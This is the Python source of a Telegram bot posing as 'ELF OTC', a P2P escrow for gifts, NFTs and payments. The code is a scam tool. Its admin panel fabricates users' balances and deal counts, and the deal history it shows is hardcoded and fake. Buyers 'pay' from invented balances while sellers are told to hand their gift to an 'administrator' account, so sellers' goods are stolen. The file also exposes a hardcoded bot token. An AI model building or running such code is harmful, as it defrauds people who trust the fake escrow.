import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, InputMediaPhoto
import uuid
import re
import os

# Конфигурация бота
TOKEN = "7638853294:AAE2RFq-MeJ6CRUxQwOFhRz-4YU0wG0OuaI"
bot = telebot.TeleBot(TOKEN)

# Структуры для хранения данных
users = {}
deals = {}
admins = set()

# Добавьте сюда ваш Telegram ID для получения прав администратора
YOUR_ADMIN_ID = 7507599731  # Замените на ваш реальный ID
admins.add(YOUR_ADMIN_ID)

# Путь к изображению
PHOTO_PATH = 'otc.jpg'
if not os.path.exists(PHOTO_PATH):
    open(PHOTO_PATH, 'wb').close()  # Создаем пустой файл, если отсутствует

# Класс состояния для FSM
class DealState:
    SET_AMOUNT = 1
    SET_DESCRIPTION = 2
    WAIT_PAYMENT = 3
    SELLER_CONFIRMED = 4
    BUYER_CONFIRMED = 5

# Инициализация данных пользователя
def init_user(user_id):
    if user_id not in users:
        users[user_id] = {
            'username': bot.get_chat(user_id).username,
            'ton_wallet': '-',
            'card_details': '-',
            'lang': 'ru',
            'success_deals': 0,
            'balance': {'TON': 0.0, 'RUB': 0.0, 'STARS': 0.0},
            'referral_id': str(user_id),
            'deal_state': None,
            'current_deal': None,
            'awaiting_admin_id': False,
            'awaiting_fake_deals': False,
            'awaiting_fake_balance': False
        }

# Генерация клавиатуры главного меню
def main_menu(user_id):
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("🪙 Добавить/изменить кошелёк", callback_data='wallet_menu'))
    keyboard.add(InlineKeyboardButton("📄 Создать сделку", callback_data='create_deal'))
    keyboard.add(InlineKeyboardButton("🧷 Реферальная ссылка", callback_data='referral'))
    keyboard.add(InlineKeyboardButton("🌐 Change language", callback_data='change_lang'))
    keyboard.add(InlineKeyboardButton("📞 Поддержка", url='http://t.me/azixfuckermam1337'))
    return keyboard

# Отправка/изменение сообщения с фото
def send_photo_message(chat_id, message_id, text, reply_markup=None):
    try:
        with open(PHOTO_PATH, 'rb') as photo:
            if message_id:
                bot.edit_message_media(
                    chat_id=chat_id,
                    message_id=message_id,
                    media=InputMediaPhoto(photo, caption=text, parse_mode='HTML'),
                    reply_markup=reply_markup
                )
            else:
                bot.send_photo(
                    chat_id=chat_id,
                    photo=photo,
                    caption=text,
                    parse_mode='HTML',
                    reply_markup=reply_markup
                )
    except Exception as e:
        print(f"Error sending photo: {e}")
        if message_id:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=text,
                parse_mode='HTML',
                reply_markup=reply_markup
            )
        else:
            bot.send_message(
                chat_id=chat_id,
                text=text,
                parse_mode='HTML',
                reply_markup=reply_markup
            )

# Обработчик команды /start
@bot.message_handler(commands=['start'])
def handle_start(message):
    user_id = message.from_user.id
    init_user(user_id)
    
    # Обработка реферальных ссылок и входа в сделку
    if len(message.text.split()) > 1:
        ref_or_deal = message.text.split()[1]
        
        # Если это ID сделки (uuid)
        if len(ref_or_deal) == 36 and ref_or_deal.count('-') == 4:
            deal_id = ref_or_deal
            if deal_id in deals:
                deal = deals[deal_id]
                deal['buyer_id'] = user_id
                users[user_id]['current_deal'] = deal_id
                
                # Уведомление продавцу
                seller_text = f"<b>👤 Пользователь @{users[user_id]['username']} присоединился к сделке #{deal_id}</b>\n• Успешные сделки: {users[user_id]['success_deals']}\n\n⚠️ Проверьте, что это тот же пользователь, с которым вы вели диалог ранее!"
                seller_keyboard = InlineKeyboardMarkup()
                seller_keyboard.add(InlineKeyboardButton("🔙 Вернуться в меню", callback_data='main_menu'))
                send_photo_message(deal['seller_id'], None, seller_text, seller_keyboard)
                
                # Уведомление покупателю
                buyer_text = f"<b>💳 Информация о сделке #{deal_id}</b>\n\n👤 Вы покупатель в сделке.\n📌 Продавец: @{users[deal['seller_id']]['username']}\n• Успешные сделки: {users[deal['seller_id']]['success_deals']}\n\n• Вы покупаете: {deal['description']}\n\n"
                
                if deal['currency'] == 'TON':
                    buyer_text += f"🏦 Адрес для оплаты (TON): {users[deal['seller_id']]['ton_wallet']}"
                elif deal['currency'] == 'RUB':
                    buyer_text += f"💳 Карта для оплаты (РФ): {users[deal['seller_id']]['card_details']}"
                else:  # STARS
                    buyer_text += f"🌟 Оплата через Telegram Stars: /pay @{bot.get_me().username} {deal['amount']}"
                
                buyer_text += f"\n\n💰 Сумма к оплате: {deal['amount']} {deal['currency']}\n📝 Комментарий к платежу (мемо): {deal_id}\n\n⚠️ Убедитесь в правильности данных перед оплатой. Комментарий (мемо) обязателен!\n\nПосле оплаты ожидайте подтверждения администратором."
                
                buyer_keyboard = InlineKeyboardMarkup()
                buyer_keyboard.add(InlineKeyboardButton("💸 Оплатить с баланса", callback_data='pay_from_balance'))
                buyer_keyboard.add(InlineKeyboardButton("🔙 Вернуться в меню", callback_data='main_menu'))
                send_photo_message(user_id, None, buyer_text, buyer_keyboard)
                return
        else:
            # Логика обработки рефералов может быть добавлена здесь
            pass
    
    text = "<b>Добро пожаловать в ELF OTC – надежный P2P-гарант</b>\n\n💼 Покупайте и продавайте всё, что угодно – безопасно!\nОт Telegram-подарков и NFT до токенов и фиата – сделки проходят легко и без риска.\n\n🔹 Удобное управление кошельками\n🔹 Реферальная система\n\nВыберите нужный раздел ниже:"
    send_photo_message(message.chat.id, None, text, main_menu(user_id))

# Обработчик команды /admin
@bot.message_handler(commands=['admin'])
def handle_admin(message):
    user_id = message.from_user.id
    if user_id in admins:
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("✏️ Выдать админку", callback_data='add_admin'))
        keyboard.add(InlineKeyboardButton("📊 Статистика бота", callback_data='stats'))
        keyboard.add(InlineKeyboardButton("💼 Накрутить сделки", callback_data='fake_deals'))
        keyboard.add(InlineKeyboardButton("💸 Накрутить баланс", callback_data='fake_balance'))
        keyboard.add(InlineKeyboardButton("❌ Закрыть панель", callback_data='close_admin'))
        bot.send_message(message.chat.id, "<b>Админ панель</b>", reply_markup=keyboard, parse_mode='HTML')
    else:
        bot.reply_to(message, "❌ У вас нет прав администратора")

# Обработчик команды /balance
@bot.message_handler(commands=['balance'])
def handle_balance(message):
    user_id = message.from_user.id
    init_user(user_id)
    user = users[user_id]
    
    deals_text = "\n💼 Последние сделки:\n"
    # Фиктивные данные для примера
    deals_text += "- Сделка #d827d39c-8817-4c1e-90b3-b91bdccd6c25 | 7.89 TON | Успешно\n"
    deals_text += "- Сделка #de437fd1-44c6-4685-b484-c155c16c8f77 | 15 TON | Успешно\n"
    deals_text += "- Сделка #55bd01e7-7e80-4d8b-b11f-e56f68de6cf8 | 1500 RUB | Успешно"
    
    text = f"👤 @{user['username']}, ваш баланс:\n\n" \
           f"💎 TON: {user['balance']['TON']}\n" \
           f"💳 RUB: {user['balance']['RUB']}\n" \
           f"⭐️ STARS: {user['balance']['STARS']}\n" + deals_text
    
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("🔙 Вернуться в меню", callback_data='main_menu'))
    bot.send_message(message.chat.id, text, reply_markup=keyboard, parse_mode='HTML')

# Обработчик инлайн кнопок
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    init_user(user_id)
    
    if call.data == 'main_menu':
        text = "<b>Добро пожаловать в ELF OTC – надежный P2P-гарант</b>\n\n💼 Покупайте и продавайте всё, что угодно – безопасно!\nОт Telegram-подарков и NFT до токенов и фиата – сделки проходят легко и без риска.\n\n🔹 Удобное управление кошельками\n🔹 Реферальная система\n\nВыберите нужный раздел ниже:"
        send_photo_message(chat_id, message_id, text, main_menu(user_id))
    
    # Меню кошельков
    elif call.data == 'wallet_menu':
        text = "<b>Выберите способ оплаты:</b>"
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("💼 Добавить/изменить TON-кошелёк", callback_data='set_ton'))
        keyboard.add(InlineKeyboardButton("💳 Добавить/изменить карту", callback_data='set_card'))
        keyboard.add(InlineKeyboardButton("🔙 Вернуться в меню", callback_data='main_menu'))
        send_photo_message(chat_id, message_id, text, keyboard)
    
    # Установка TON-кошелька
    elif call.data == 'set_ton':
        user = users[user_id]
        text = f"<b>💼 Ваш текущий TON-кошелек:</b> {user['ton_wallet']}\n\nПожалуйста, отправьте новый адрес вашего кошелька."
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("🔙 Вернуться в меню", callback_data='main_menu'))
        send_photo_message(chat_id, message_id, text, keyboard)
    
    # Установка карты
    elif call.data == 'set_card':
        user = users[user_id]
        text = f"<b>💳 Ваши текущие реквизиты:</b> {user['card_details']}\n\nПожалуйста, отправьте реквизиты в формате: `Банк - Номер карты`."
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("🔙 Вернуться в меню", callback_data='main_menu'))
        send_photo_message(chat_id, message_id, text, keyboard)
    
    # Создание сделки
    elif call.data == 'create_deal':
        text = "<b>💰 Выберите метод получения оплаты:</b>"
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("💎 TON", callback_data='method_TON'))
        keyboard.add(InlineKeyboardButton("💳 Карта (РФ)", callback_data='method_RUB'))
        keyboard.add(InlineKeyboardButton("⭐ Звезды", callback_data='method_STARS'))
        keyboard.add(InlineKeyboardButton("🔙 Вернуться в меню", callback_data='main_menu'))
        send_photo_message(chat_id, message_id, text, keyboard)
    
    # Выбор метода оплаты для сделки
    elif call.data.startswith('method_'):
        currency = call.data.split('_')[1]
        users[user_id]['deal_state'] = DealState.SET_AMOUNT
        users[user_id]['current_deal'] = {
            'currency': currency,
            'seller_id': user_id
        }
        text = "<b>💼 Создание сделки</b>\n\nВведите сумму в формате: `100.5`"
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("🔙 Вернуться в меню", callback_data='main_menu'))
        send_photo_message(chat_id, message_id, text, keyboard)
    
    # Реферальная система
    elif call.data == 'referral':
        user = users[user_id]
        ref_link = f"https://t.me/{bot.get_me().username}?start={user['referral_id']}"
        text = f"<b>🧷 Ваша реферальная ссылка:</b> {ref_link}\n\nПриглашайте друзей и получайте бонусы за их сделки!"
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("🔙 Вернуться в меню", callback_data='main_menu'))
        send_photo_message(chat_id, message_id, text, keyboard)
    
    # Смена языка
    elif call.data == 'change_lang':
        text = "<b>🌍 Choose your language:</b>\n\n🌍 Выберите язык:"
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("🇺🇸 English", callback_data='lang_en'))
        keyboard.add(InlineKeyboardButton("🇷🇺 Русский", callback_data='lang_ru'))
        keyboard.add(InlineKeyboardButton("🔙 Вернуться в меню", callback_data='main_menu'))
        send_photo_message(chat_id, message_id, text, keyboard)
    
    # Админ-панель
    elif call.data == 'add_admin':
        users[user_id]['awaiting_admin_id'] = True
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("❌ Закрыть", callback_data='close_admin'))
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text="<b>🆔 Введи айди нового админа</b>",
            parse_mode='HTML',
            reply_markup=keyboard
        )
    
    elif call.data == 'stats':
        text = f"<b>📊 Статистика ОТС бота</b>\n\nВсего пользователей: {len(users)}\nВсего воркеров: {len(admins)}"
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("❌ Закрыть", callback_data='close_admin'))
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=text,
            parse_mode='HTML',
            reply_markup=keyboard
        )
    
    elif call.data == 'fake_deals':
        users[user_id]['awaiting_fake_deals'] = True
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("❌ Закрыть", callback_data='close_admin'))
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text="<b>💼 Для накрутки успешных сделок напиши айди и кол-во сделок</b>\nПример: 12345678 15",
            parse_mode='HTML',
            reply_markup=keyboard
        )
    
    elif call.data == 'fake_balance':
        users[user_id]['awaiting_fake_balance'] = True
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("❌ Закрыть", callback_data='close_admin'))
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text="<b>💸 Для накрутки баланса напиши айди, кол-во и валюту</b>\nПример: 12345678 15 TON/RUB/STARS",
            parse_mode='HTML',
            reply_markup=keyboard
        )
    
    elif call.data == 'close_admin':
        bot.delete_message(chat_id, message_id)
    
    # Подтверждение оплаты
    elif call.data == 'pay_from_balance':
        deal_id = users[user_id]['current_deal']
        deal = deals[deal_id]
        
        # Проверка баланса
        if users[user_id]['balance'][deal['currency']] < deal['amount']:
            bot.answer_callback_query(call.id, "❌ Недостаточно средств на балансе", show_alert=True)
            return
        
        # Обновление баланса
        users[user_id]['balance'][deal['currency']] -= deal['amount']
        users[deal['seller_id']]['balance'][deal['currency']] += deal['amount']
        
        # Уведомление покупателю
        text = f"<b>✅ Оплата подтверждена для сделки #{deal_id}.</b>\n\nПожалуйста, дождитесь подтверждения администратора получения товара."
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("🔙 Вернуться в меню", callback_data='main_menu'))
        send_photo_message(chat_id, message_id, text, keyboard)
        
        # Уведомление продавцу
        seller_text = f"<b>✅ Оплата подтверждена для сделки #{deal_id}</b>\n\n📜 Описание: {deal['description']}\n👤 Отправьте подарок администратору — @azixfuckermam1337\n\n⚠️ Отправляйте подарок только администратору. Обязательно записывайте момент передачи на видео."
        seller_keyboard = InlineKeyboardMarkup()
        seller_keyboard.add(InlineKeyboardButton("📤 Я отправил подарок", callback_data=f'confirm_send_{deal_id}'))
        seller_keyboard.add(InlineKeyboardButton("📞 Связаться с поддержкой", url='http://t.me/azixfuckermam1337'))
        send_photo_message(deal['seller_id'], None, seller_text, seller_keyboard)
    
    # Подтверждение отправки товара
    elif call.data.startswith('confirm_send_'):
        deal_id = call.data.split('_')[-1]
        deal = deals[deal_id]
        
        # Уведомление продавцу
        text = f"<b>✅ Вы подтвердили отправку подарка для сделки #{deal_id}.</b>\n\nОжидайте подтверждения получения от администратора."
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("🔙 Вернуться в меню", callback_data='main_menu'))
        send_photo_message(chat_id, message_id, text, keyboard)
        
        # Уведомление покупателю
        buyer_text = f"<b>🎁 Продавец @{users[deal['seller_id']]['username']} подтвердил отправку подарка для сделки #{deal_id}.</b>\n\nПожалуйста, дождитесь подтверждения администратора."
        buyer_keyboard = InlineKeyboardMarkup()
        buyer_keyboard.add(InlineKeyboardButton("📥 Я получил подарок", callback_data=f'confirm_recv_{deal_id}'))
        buyer_keyboard.add(InlineKeyboardButton("📞 Связаться с поддержкой", url='http://t.me/azixfuckermam1337'))
        send_photo_message(deal['buyer_id'], None, buyer_text, buyer_keyboard)
    
    # Подтверждение получения товара
    elif call.data.startswith('confirm_recv_'):
        deal_id = call.data.split('_')[-1]
        deal = deals[deal_id]
        
        # Обновление статистики
        users[deal['seller_id']]['success_deals'] += 1
        users[deal['buyer_id']]['success_deals'] += 1
        
        # Уведомление всем участникам
        text = f"<b>✅ Сделка #{deal_id} завершена.</b>\n\nСпасибо за использование нашего сервиса."
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("🔙 Вернуться в меню", callback_data='main_menu'))
        
        send_photo_message(deal['seller_id'], None, text, keyboard)
        send_photo_message(deal['buyer_id'], None, text, keyboard)
        
        # Очистка данных сделки
        del deals[deal_id]

# Обработчик текстовых сообщений
@bot.message_handler(content_types=['text'])
def handle_text(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    init_user(user_id)
    user = users[user_id]
    
    # Обработка TON-кошелька
    if user.get('deal_state') is None and message.text.startswith('UQ'):
        user['ton_wallet'] = message.text
        text = f"<b>🔗 TON-кошелёк обновлен:</b> {user['ton_wallet']}"
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("🔙 Вернуться в меню", callback_data='main_menu'))
        send_photo_message(chat_id, None, text, keyboard)
        return
    
    # Обработка реквизитов карты
    elif user.get('deal_state') is None and '-' in message.text:
        user['card_details'] = message.text
        text = f"<b>🔗 Карта обновлена:</b> {user['card_details']}"
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("🔙 Вернуться в меню", callback_data='main_menu'))
        send_photo_message(chat_id, None, text, keyboard)
        return
    
    # Обработка суммы сделки
    elif user.get('deal_state') == DealState.SET_AMOUNT:
        try:
            amount = float(message.text)
            user['current_deal']['amount'] = amount
            user['deal_state'] = DealState.SET_DESCRIPTION
            
            text = "<b>📝 Укажите, что вы предлагаете в этой сделке:</b>\n\nПример: 10 Кепок и Пепочка"
            keyboard = InlineKeyboardMarkup()
            keyboard.add(InlineKeyboardButton("🔙 Вернуться в меню", callback_data='main_menu'))
            bot.send_message(chat_id, text, reply_markup=keyboard, parse_mode='HTML')
        except ValueError:
            bot.send_message(chat_id, "❌ Неверный формат суммы. Введите число (например: 100.5)")
    
    # Обработка описания сделки
    elif user.get('deal_state') == DealState.SET_DESCRIPTION:
        description = message.text
        deal_id = str(uuid.uuid4())
        currency = user['current_deal']['currency']
        
        # Сохранение сделки
        deals[deal_id] = {
            'seller_id': user_id,
            'amount': user['current_deal']['amount'],
            'currency': currency,
            'description': description,
            'buyer_id': None,
            'status': 'created'
        }
        
        # Ссылка для покупателя
        deal_link = f"https://t.me/{bot.get_me().username}?start={deal_id}"
        
        # Уведомление продавцу
        text = f"<b>✅ Сделка успешно создана!</b>\n\n" \
               f"💰 Сумма: {user['current_deal']['amount']} {currency}\n" \
               f"📜 Описание: {description}\n" \
               f"🔗 Ссылка для покупателя: {deal_link}"
        
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("🔙 Вернуться в меню", callback_data='main_menu'))
        send_photo_message(chat_id, None, text, keyboard)
        
        # Сброс состояния
        user['deal_state'] = None
        user['current_deal'] = None
    
    # Обработка админ-команд
    elif user_id in admins:
        # Выдача админки
        if user.get('awaiting_admin_id'):
            try:
                new_admin_id = int(message.text)
                admins.add(new_admin_id)
                bot.send_message(chat_id, f"✅ Пользователь {new_admin_id} теперь администратор")
                user['awaiting_admin_id'] = False
            except ValueError:
                bot.send_message(chat_id, "❌ Неверный формат ID. Введите целое число")
        
        # Накрутка сделок
        elif user.get('awaiting_fake_deals'):
            try:
                target_id, count = map(int, message.text.split())
                if target_id not in users:
                    init_user(target_id)
                users[target_id]['success_deals'] += count
                bot.send_message(chat_id, f"✅ Успешно добавлено {count} сделок для пользователя {target_id}")
                user['awaiting_fake_deals'] = False
            except:
                bot.send_message(chat_id, "❌ Ошибка формата. Используйте: 12345678 15")
        
        # Накрутка баланса
        elif user.get('awaiting_fake_balance'):
            try:
                parts = message.text.split()
                target_id = int(parts[0])
                amount = float(parts[1])
                currency = parts[2].upper()
                
                if currency not in ['TON', 'RUB', 'STARS']:
                    bot.send_message(chat_id, "❌ Неверная валюта. Допустимые значения: TON, RUB, STARS")
                    return
                
                if target_id not in users:
                    init_user(target_id)
                
                users[target_id]['balance'][currency] += amount
                bot.send_message(chat_id, f"✅ Баланс пользователя {target_id} пополнен на {amount} {currency}")
                user['awaiting_fake_balance'] = False
            except:
                bot.send_message(chat_id, "❌ Ошибка формата. Используйте: 12345678 15 TON")

# Запуск бота
if __name__ == '__main__':
    print("Бот запущен...")
    bot.infinity_polling()
